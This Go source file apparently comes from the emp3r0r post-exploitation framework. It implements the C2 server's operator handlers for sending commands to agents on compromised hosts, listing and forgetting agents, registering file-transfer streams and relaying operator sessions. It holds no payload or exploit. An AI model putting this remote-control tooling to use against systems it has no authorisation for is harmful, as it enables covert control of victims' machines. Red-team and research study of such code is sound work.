package server

import (
	"context"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
)

// represents an operator_t
type operator_t struct {
	sessionID string     // marks the operator session
	conn      net.Conn   // message tunnel, used to relay messages
	mu        sync.Mutex // serialize writes to operator tunnel
}

var (
	// OPERATORS holds all operator connections
	OPERATORS sync.Map
	// operatorJobOwners maps job IDs to the owning operator session.
	operatorJobOwners sync.Map
	// operatorClaimNonceCache stores recently seen nonces to reject replayed
	// operator stream-activation claims.
	operatorClaimNonceCache sync.Map

	// SERVER_WG_CONFIG is the wireguard config for the server
	SERVER_WG_CONFIG *netutil.WireGuardConfig
)

const operatorClaimNonceTTLSeconds int64 = 600

// DecodeCBORBody decodes CBOR HTTP request body
func DecodeCBORBody[T any](wrt http.ResponseWriter, req *http.Request) (*T, error) {
	var dst T
	if err := cbor.NewDecoder(req.Body).Decode(&dst); err != nil {
		http.Error(wrt, err.Error(), http.StatusBadRequest)
		return nil, err
	}
	return &dst, nil
}

func operatorSessionFromReq(req *http.Request) (string, error) {
	session := strings.TrimSpace(req.Header.Get("operator_session"))
	if session == "" {
		return "", fmt.Errorf("missing operator_session")
	}
	return session, nil
}

func operatorPubKeyPEMFromReq(req *http.Request) ([]byte, string, error) {
	if req == nil || req.TLS == nil || len(req.TLS.PeerCertificates) == 0 {
		return nil, "", fmt.Errorf("missing operator mTLS peer certificate")
	}
	cert := req.TLS.PeerCertificates[0]
	pubBytes, err := x509.MarshalPKIXPublicKey(cert.PublicKey)
	if err != nil {
		return nil, "", fmt.Errorf("marshal operator public key: %w", err)
	}
	pubPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubBytes})
	fp := sha256.Sum256(cert.Raw)
	return pubPEM, hex.EncodeToString(fp[:]), nil
}

func rememberOperatorClaimNonce(fingerprint, session, nonce string, ts int64) error {
	if fingerprint == "" || session == "" || nonce == "" {
		return fmt.Errorf("invalid nonce cache key")
	}
	now := time.Now().Unix()
	key := fingerprint + ":" + session + ":" + nonce
	if prev, exists := operatorClaimNonceCache.Load(key); exists {
		if prevTS, ok := prev.(int64); ok && now-prevTS <= transport.OperatorClaimMaxTTLSeconds {
			return fmt.Errorf("replayed claim nonce")
		}
	}
	operatorClaimNonceCache.Store(key, ts)
	operatorClaimNonceCache.Range(func(k, v any) bool {
		nonceTS, ok := v.(int64)
		if !ok || now-nonceTS > operatorClaimNonceTTLSeconds {
			operatorClaimNonceCache.Delete(k)
		}
		return true
	})
	return nil
}

func verifyOperatorStreamClaim(req *http.Request, claim *def.OperatorStreamClaim, streamID, capability string) (string, error) {
	session, err := operatorSessionFromReq(req)
	if err != nil {
		return "", err
	}
	pubPEM, fp, err := operatorPubKeyPEMFromReq(req)
	if err != nil {
		return "", err
	}
	if err = transport.VerifyOperatorStreamClaim(claim, session, streamID, capability, pubPEM); err != nil {
		return "", err
	}
	if err = rememberOperatorClaimNonce(fp, session, claim.Nonce, claim.IssuedAt); err != nil {
		return "", err
	}
	if _, ok := OPERATORS.Load(session); !ok {
		return "", fmt.Errorf("operator session not connected")
	}
	return session, nil
}

func setJobOwner(jobID, operatorSession string) {
	if jobID == "" || operatorSession == "" {
		return
	}
	operatorJobOwners.Store(jobID, operatorSession)
}

func getJobOwner(jobID string) (string, bool) {
	if jobID == "" {
		return "", false
	}
	owner, ok := operatorJobOwners.Load(jobID)
	if !ok {
		return "", false
	}
	ownerID, ok := owner.(string)
	if !ok || ownerID == "" {
		return "", false
	}
	return ownerID, true
}

func cleanupOperatorOwnedJobs(operatorSession string) {
	if operatorSession == "" {
		return
	}
	operatorJobOwners.Range(func(k, v any) bool {
		owner, ok := v.(string)
		if ok && owner == operatorSession {
			operatorJobOwners.Delete(k)
		}
		return true
	})
}

func handleSetActiveAgent(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleSetActiveAgent panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Set active agent
	agents.SetActiveAgent(operation.AgentTag)

	// Return active agent
	wrt.Header().Set("Content-Type", "application/cbor")
	if err := cbor.NewEncoder(wrt).Encode(live.ActiveAgent); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

func handleSendCommand(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleSendCommand panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Get agent
	agent := agents.GetAgentByTag(operation.AgentTag)
	if agent == nil {
		http.Error(wrt, "Agent not found", http.StatusNotFound)
		return
	}

	// Get command and job ID
	if !operation.IsOptionSet("command") || !operation.IsOptionSet("job_id") {
		http.Error(wrt, "Command or JobID is empty", http.StatusBadRequest)
		return
	}
	operatorSession, sessErr := operatorSessionFromReq(req)
	if sessErr == nil {
		setJobOwner(*operation.JobID, operatorSession)
	}

	// Track the job ID so the message tunnel accepts the response
	live.CmdTime.Store(*operation.JobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))

	// Send command to agent
	err = agents.SendCmd(*operation.Command, *operation.JobID, agent)
	if err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
		return
	}
	wrt.WriteHeader(http.StatusOK)
}

func handleListAgents(wrt http.ResponseWriter, _ *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleListAgents panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Get all agents
	agentsList := agents.GetConnectedAgents()

	wrt.Header().Set("Content-Type", "application/cbor")
	if err := cbor.NewEncoder(wrt).Encode(agentsList); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

func handleForgetAgent(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleForgetAgent panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body to get Agent UUID
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	uuid := operation.AgentTag
	uuid = strings.TrimSpace(uuid)
	if unquoted, err := strconv.Unquote(uuid); err == nil {
		uuid = unquoted
	}
	if uuid == "" {
		http.Error(wrt, "Agent UUID is empty", http.StatusBadRequest)
		return
	}

	requestedID := uuid
	if byTag := agents.GetAgentByTag(requestedID); byTag != nil && byTag.UUID != "" {
		uuid = byTag.UUID
	}

	// Prepare response message with agent details
	var agentDetails string = fmt.Sprintf("Agent %s", uuid)
	if requestedID != uuid {
		agentDetails = fmt.Sprintf("Agent %s (resolved from tag %s)", uuid, requestedID)
	}

	// Try to get agent details from memory first (if connected/recently connected)
	var targetAgent *def.Emp3r0rAgent
	live.AgentControlMap.Range(func(key, value any) bool {
		a := key.(*def.Emp3r0rAgent)
		if a.UUID == uuid {
			targetAgent = a
			return false // stop iteration
		}
		return true
	})
	if targetAgent == nil {
		targetAgent = agents.GetAgentByUUID(uuid)
	}
	if targetAgent != nil && targetAgent.Tag != "" {
		agentDetails += fmt.Sprintf("\n  Tag: %s\n  Hostname: %s\n  IPs: %s\n  OS: %s",
			targetAgent.Tag, targetAgent.Hostname, strings.Join(targetAgent.IPs, ", "), targetAgent.OS)
	} else if agents.AgentDB != nil {
		// Try to get from DB
		stored, err := agents.GetStoredAgent(uuid)
		// Try DB fallback even if targetAgent is a placeholder
		if err == nil && stored != nil {
			agentDetails += fmt.Sprintf("\n  Tag: %s\n  Hostname: %s\n  IPs: %s\n  OS: %s\n  (Offline/Database Record)",
				stored.Tag, stored.Hostname, stored.IPAddresses, stored.OS)
		}
	}

	// Remove from DB
	if agents.AgentDB != nil {
		err := agents.RemoveAgent(uuid)
		if err != nil {
			if requestedID == uuid {
				if byTag := agents.GetAgentByTag(requestedID); byTag != nil && byTag.UUID != "" {
					uuid = byTag.UUID
					err = agents.RemoveAgent(uuid)
				}
			}
		}
		if err != nil {
			logging.Errorf("Failed to remove agent %s from DB: %v", uuid, err)
			http.Error(wrt, fmt.Sprintf("DB removal failed: %v", err), http.StatusInternalServerError)
			return
		}
	} else {
		http.Error(wrt, "Agent database not initialized", http.StatusInternalServerError)
		return
	}

	// Remove from memory
	if targetAgent != nil {
		live.AgentControlMap.Delete(targetAgent)
		logging.Successf("Operator removed agent %s from memory", uuid)
	}
	wrt.WriteHeader(http.StatusOK)
	fmt.Fprintf(wrt, "%s\n\nHas been forgotten.", agentDetails)
}

func handleRegisterFTPStream(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleRegisterFTPStream panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	ftpReq, err := DecodeCBORBody[def.FTPStreamRequest](wrt, req)
	if err != nil {
		return
	}
	operatorSession, err := verifyOperatorStreamClaim(req, ftpReq.Claim, ftpReq.Token, def.OperatorCapabilityRegisterFTP)
	if err != nil {
		logging.Errorf("CRITICAL: Reject ftp stream registration from %s: %v", req.RemoteAddr, err)
		http.Error(wrt, "Unauthorized", http.StatusUnauthorized)
		return
	}
	// Register token in server's map
	sh := &network.StreamHandler{
		Token:           ftpReq.Token,
		StreamID:        ftpReq.Token,
		Capability:      def.OperatorCapabilityRegisterFTP,
		OperatorSession: operatorSession,
		ExpectedSize:    ftpReq.ExpectedSize,
		Checksum:        ftpReq.Checksum,
	}
	network.FTPStreams.Store(ftpReq.FilePath, sh)
	network.FTPStreams.Store("token:"+ftpReq.Token, sh)

	logging.Infof("Registered FTP stream token %s for %s from operator", ftpReq.Token, ftpReq.FilePath)
	wrt.WriteHeader(http.StatusOK)
}

func handleUnregisterFTPStream(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleUnregisterFTPStream panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	ftpReq, err := DecodeCBORBody[def.FTPStreamRequest](wrt, req)
	if err != nil {
		return
	}
	operatorSession, err := operatorSessionFromReq(req)
	if err != nil {
		logging.Errorf("CRITICAL: Reject unregister ftp from %s: %v", req.RemoteAddr, err)
		http.Error(wrt, "Unauthorized", http.StatusUnauthorized)
		return
	}
	val, ok := network.FTPStreams.Load("token:" + ftpReq.Token)
	if ok {
		if sh, castOK := val.(*network.StreamHandler); castOK && sh != nil && sh.OperatorSession != "" && sh.OperatorSession != operatorSession {
			logging.Errorf("CRITICAL: operator %s attempted to unregister ftp stream owned by %s", operatorSession, sh.OperatorSession)
			http.Error(wrt, "Forbidden", http.StatusForbidden)
			return
		}
	}

	// Unregister token in server's map
	network.FTPStreams.Delete(ftpReq.FilePath)
	network.FTPStreams.Delete("token:" + ftpReq.Token)

	logging.Infof("Unregistered FTP stream token %s for %s from operator", ftpReq.Token, ftpReq.FilePath)
	wrt.WriteHeader(http.StatusOK)
}

func handleGetCA(wrt http.ResponseWriter, _ *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleGetCA panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	caData, err := os.ReadFile(transport.CaCrtFile)
	if err != nil {
		logging.Errorf("Failed to read CA cert: %v", err)
		http.Error(wrt, "Failed to read CA cert", http.StatusInternalServerError)
		return
	}

	serverCrtData, err := os.ReadFile(transport.ServerCrtFile)
	if err != nil {
		logging.Errorf("Failed to read Server cert: %v", err)
		http.Error(wrt, "Failed to read Server cert", http.StatusInternalServerError)
		return
	}

	resp := map[string][]byte{
		"ca_crt":     caData,
		"server_crt": serverCrtData,
	}

	data, err := cbor.Marshal(resp)
	if err != nil {
		logging.Errorf("Failed to marshal certs: %v", err)
		http.Error(wrt, "Failed to marshal response", http.StatusInternalServerError)
		return
	}

	wrt.Header().Set("Content-Type", "application/cbor")
	wrt.WriteHeader(http.StatusOK)
	wrt.Write(data)
}

// handleOperatorConn handles operator connections, this connection will be used to relay the message tunnel
func handleOperatorConn(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleOperatorConn panicked: %v", r)
		}
	}()
	wsConn, err := websocket.Accept(wrt, req, &websocket.AcceptOptions{})
	if err != nil {
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	conn := websocket.NetConn(req.Context(), wsConn, websocket.MessageBinary)
	operator_session := req.Header.Get("operator_session")

	// Check if other operators are already connected
	activeSessionCount := 0
	OPERATORS.Range(func(key, value any) bool {
		activeSessionCount++
		return true
	})
	if activeSessionCount > 0 {
		logging.Warningf("⚠️  New operator %s connecting while %d session(s) active!", operator_session, activeSessionCount)

		// Construct a warning message
		warningMsg := def.MsgTunData{
			Tag: "ERROR", // "ERROR" tag triggers red text in your UI
			Response: []byte(fmt.Sprintf(
				"\n\n⛔  ERROR: %d other operator session(s) are currently active!\n"+
					"   Concurrent usage is PROHIBITED to prevent state corruption.\n"+
					"   Closing connection... Please retry when the other session is closed.\n", activeSessionCount,
			)),
		}

		// Send the warning immediately upon connection
		encoder := cbor.NewEncoder(conn)
		if err := encoder.Encode(warningMsg); err != nil {
			logging.Errorf("Failed to send concurrency warning: %v", err)
		}
		time.Sleep(100 * time.Millisecond) // Ensure the message is sent
		conn.Close()
		return
	}
	logging.Infof("Operator %s connected to message tunnel from %s", operator_session, req.RemoteAddr)
	op, _ := OPERATORS.LoadOrStore(operator_session, &operator_t{
		sessionID: operator_session,
		conn:      conn,
	})
	operator := op.(*operator_t)
	operator.conn = conn
	OPERATORS.Store(operator_session, operator)

	ctx, cancel := context.WithCancel(req.Context())
	readDone := make(chan struct{})
	go func() {
		defer close(readDone)
		decoder := cbor.NewDecoder(conn)
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			msg := new(def.MsgTunData)
			if err := decoder.Decode(msg); err != nil {
				return
			}
			handleOperatorRelayFrame(operator_session, msg)
		}
	}()
	defer func() {
		logging.Debugf("handleOperatorConn exiting")
		OPERATORS.Delete(operator_session)
		cleanupOperatorOwnedJobs(operator_session)

		// If this was the last operator, disconnect all agents
		lastOperator := true
		OPERATORS.Range(func(key, value any) bool {
			lastOperator = false
			return false // stop iteration
		})

		if lastOperator {
			logging.Infof("Last operator disconnected, closing all agent connections")
			agents.DisconnectAllAgents()
		}

		_ = conn.Close()
		cancel()
		<-readDone
	}()

	// Create a ticker to send keepalive pings
	pingTicker := time.NewTicker(10 * time.Second)
	defer pingTicker.Stop()

	// receiving heartbeats from the operator
	for {
		select {
		case <-readDone:
			logging.Infof("Operator %s disconnected (TCP connection closed)", operator_session)
			return
		case <-pingTicker.C:
			// Send WebSocket ping to detect silent disconnections
			pingCtx, pingCancel := context.WithTimeout(ctx, 5*time.Second)
			err := wsConn.Ping(pingCtx)
			pingCancel()
			if err != nil {
				logging.Warningf("Operator %s ping timeout/error, closing connection: %v", operator_session, err)
				conn.Close()
				cancel()
				return
			}
		case <-ctx.Done():
			logging.Warningf("handleOperatorConn exited")
			return
		}
	}
}
